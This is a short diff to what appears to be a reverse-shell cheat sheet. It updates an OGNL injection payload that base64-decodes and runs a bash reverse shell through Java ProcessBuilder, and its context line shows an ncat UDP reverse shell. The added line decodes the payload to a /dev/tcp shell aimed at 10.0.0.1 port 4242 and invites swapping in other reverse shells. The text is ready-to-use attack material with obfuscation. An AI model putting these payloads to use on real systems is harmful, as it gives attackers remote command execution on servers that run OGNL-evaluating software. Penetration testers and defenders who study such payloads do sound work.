@@ -256,8 +256,10 @@ ncat --udp 10.0.0.1 4242 -e /bin/bash
 ### OGNL
 
 ```java
-(#a='echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xLjIuMy40LzQ0NDQgMD4mMScK | base64 -d | bash -i').(#b={'bash','-c',#a}).(#p=new java.lang.ProcessBuilder(#b)).(#process=#p.start())
+(#a='echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80MjQyIDA+JjEnCg== | base64 -d | bash -i').(#b={'bash','-c',#a}).(#p=new java.lang.ProcessBuilder(#b)).(#process=#p.start())
 ```
+
+With `YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80MjQyIDA+JjEnCg==` decoding to `bash -c 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'`, the payload within the single quotes might be changed by any Linux-compatible reverse shell.
 
 ### OpenSSL
 
